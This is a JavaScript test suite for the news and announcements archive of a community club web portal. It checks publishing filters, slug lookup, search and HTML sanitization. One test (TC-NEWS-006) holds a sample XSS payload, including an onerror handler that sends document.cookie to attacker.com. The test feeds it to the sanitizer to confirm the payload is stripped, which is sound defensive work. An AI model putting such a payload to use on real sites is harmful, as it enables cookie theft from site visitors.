import test, { describe, it } from 'node:test';
import assert from 'node:assert/strict';

import {
  filterPublishedNews,
  getNewsBySlug,
  sanitizeNewsContent,
  sanitizeNewsQuery,
  formatNewsDate,
} from '../src/lib/news.ts';
import { SEED_NEWS } from '../src/data/mock-news.ts';
import {
  getPublishedNewsFromDb,
  getPublishedNewsBySlugFromDb,
} from '../src/lib/news-repository.ts';

describe('News and Announcements Public Archive (LBW-37, EPIC-04) Test Suite', () => {
  it('TC-NEWS-001: Public news list returns published items newest first with title, date, and summary (AC-1)', () => {
    const results = filterPublishedNews(SEED_NEWS);

    // Seed data has 5 items: 4 PUBLISHED, 1 DRAFT
    assert.strictEqual(results.length, 4, 'Must return exactly 4 published news items');

    // Verify all items have required fields
    results.forEach((item) => {
      assert.ok(item.id, 'Item must have an id');
      assert.ok(item.title, 'Item must have a title');
      assert.ok(item.slug, 'Item must have a slug');
      assert.ok(item.summary, 'Item must have a summary');
      assert.ok(item.publishedAt, 'Item must have a publishedAt timestamp');
      assert.ok(item.newsType, 'Item must have a newsType');
      assert.strictEqual(item.status, 'PUBLISHED', 'All returned items must have status PUBLISHED');
    });

    // Verify order: Pinned items appear first, then newest first
    const pinnedItems = results.filter((i) => i.isPinned);
    const unpinnedItems = results.filter((i) => !i.isPinned);

    assert.ok(pinnedItems.length > 0, 'Should have at least 1 pinned announcement in seed');
    assert.strictEqual(results[0].isPinned, true, 'First item must be the pinned announcement');

    // Check chronological descending order for unpinned items
    for (let i = 0; i < unpinnedItems.length - 1; i++) {
      const currentDate = new Date(unpinnedItems[i].publishedAt).getTime();
      const nextDate = new Date(unpinnedItems[i + 1].publishedAt).getTime();
      assert.ok(
        currentDate >= nextDate,
        `News items must be ordered newest first: ${unpinnedItems[i].title} vs ${unpinnedItems[i + 1].title}`
      );
    }
  });

  it('TC-NEWS-002: Security rule: Draft / unpublished items are NEVER exposed on public endpoints (AC-2)', () => {
    const publicNews = filterPublishedNews(SEED_NEWS);

    const containsDraft = publicNews.some((item) => item.status === 'DRAFT');
    assert.strictEqual(
      containsDraft,
      false,
      'DRAFT items must be strictly excluded from public news list'
    );

    // Searching specifically for draft title must return 0 results
    const searchDraft = filterPublishedNews(SEED_NEWS, { query: 'Internal Cabinet Meeting' });
    assert.strictEqual(
      searchDraft.length,
      0,
      'Searching for draft keywords must yield zero public results'
    );

    // Slug lookup for draft item must return null
    const draftBySlug = getNewsBySlug('internal-cabinet-meeting-discussion-notes', SEED_NEWS);
    assert.strictEqual(draftBySlug, null, 'Slug lookup for DRAFT item must strictly return null');
  });

  it('TC-NEWS-003: Public detail page lookup retrieves published news by slug (AC-2)', () => {
    const item = getNewsBySlug('official-launch-balangoda-web-portal', SEED_NEWS);
    assert.ok(item, 'Should retrieve published news item by slug');
    assert.strictEqual(item.slug, 'official-launch-balangoda-web-portal');
    assert.strictEqual(
      item.title,
      'Official Launch of the Lions Club of Balangoda Community Web Portal'
    );
    assert.strictEqual(item.status, 'PUBLISHED');
    assert.ok(item.content.length > 0, 'Article content must be present');

    // Unknown slug returns null
    const notFoundItem = getNewsBySlug('non-existent-article-slug', SEED_NEWS);
    assert.strictEqual(notFoundItem, null, 'Non-existent slug must return null');
  });

  it('TC-NEWS-004: News type filtering isolates announcements, news, and press releases', () => {
    const announcements = filterPublishedNews(SEED_NEWS, { newsType: 'ANNOUNCEMENT' });
    assert.ok(announcements.length > 0, 'Must return announcements');
    assert.ok(announcements.every((a) => a.newsType === 'ANNOUNCEMENT'));

    const newsOnly = filterPublishedNews(SEED_NEWS, { newsType: 'NEWS' });
    assert.ok(newsOnly.length > 0, 'Must return news items');
    assert.ok(newsOnly.every((n) => n.newsType === 'NEWS'));

    const pressReleases = filterPublishedNews(SEED_NEWS, { newsType: 'PRESS_RELEASE' });
    assert.ok(pressReleases.length > 0, 'Must return press releases');
    assert.ok(pressReleases.every((p) => p.newsType === 'PRESS_RELEASE'));
  });

  it('TC-NEWS-005: Keyword search filters by title and summary (case-insensitive)', () => {
    const searchVision = filterPublishedNews(SEED_NEWS, { query: 'eye camp' });
    assert.strictEqual(searchVision.length, 1, 'Should find 1 item matching "eye camp"');
    assert.ok(searchVision[0].title.toLowerCase().includes('eye camp'));

    const searchSummary = filterPublishedNews(SEED_NEWS, { query: 'walawe' });
    assert.strictEqual(searchSummary.length, 1, 'Should find item by word in summary');
  });

  it('TC-NEWS-006: Content output sanitization disarms XSS script injection (AC-4, SEC-02)', () => {
    const maliciousHtml = `
      <p>Legitimate club news report.</p>
      <script>alert("XSS Attack!");</script>
      <img src="avatar.jpg" onerror="fetch('http://attacker.com/steal?cookie=' + document.cookie)" />
      <a href="javascript:alert('malicious')">Click here</a>
      <iframe src="http://evil.com"></iframe>
    `;

    const sanitized = sanitizeNewsContent(maliciousHtml);

    assert.ok(!sanitized.includes('<script>'), 'Script tags must be stripped');
    assert.ok(!sanitized.includes('alert('), 'Executable alerts must be eliminated');
    assert.ok(!sanitized.includes('onerror='), 'Inline event handlers must be stripped');
    assert.ok(!sanitized.includes('javascript:'), 'javascript: URLs must be disarmed');
    assert.ok(!sanitized.includes('<iframe'), 'Iframe tags must be stripped');
    assert.ok(
      sanitized.includes('<p>Legitimate club news report.</p>'),
      'Safe HTML elements must be preserved'
    );
  });

  it('TC-NEWS-007: Empty results state is cleanly handled (AC-3)', () => {
    const emptyResult = filterPublishedNews(SEED_NEWS, { query: 'xyznonexistentquery999' });
    assert.ok(Array.isArray(emptyResult), 'Should return an array');
    assert.strictEqual(emptyResult.length, 0, 'Should return empty array without error');
  });

  it('TC-NEWS-008: Date formatting helper formats ISO timestamp to community standard', () => {
    const formatted = formatNewsDate('2026-10-15T09:00:00Z');
    assert.ok(formatted.includes('2026'), 'Formatted date must include year');
    assert.ok(formatted.includes('October'), 'Formatted date must include full month name');
  });

  it('TC-NEWS-009: Repository database queries strictly enforce status and error boundaries', () => {
    const dbResults = getPublishedNewsFromDb();
    assert.ok(Array.isArray(dbResults), 'Repository must return an array');
    assert.ok(dbResults.length > 0, 'Repository must return published items');
    assert.ok(
      dbResults.every((item) => item.status === 'PUBLISHED'),
      'All items returned from DB repository must be PUBLISHED'
    );

    // Detail lookup from DB
    const item = getPublishedNewsBySlugFromDb('official-launch-balangoda-web-portal');
    assert.ok(item, 'Should find item by slug in DB');
    assert.strictEqual(item.status, 'PUBLISHED');

    // Unknown slug returns null
    const notFound = getPublishedNewsBySlugFromDb('invalid-test-slug-999');
    assert.strictEqual(notFound, null, 'Unknown slug must return null');
  });
});
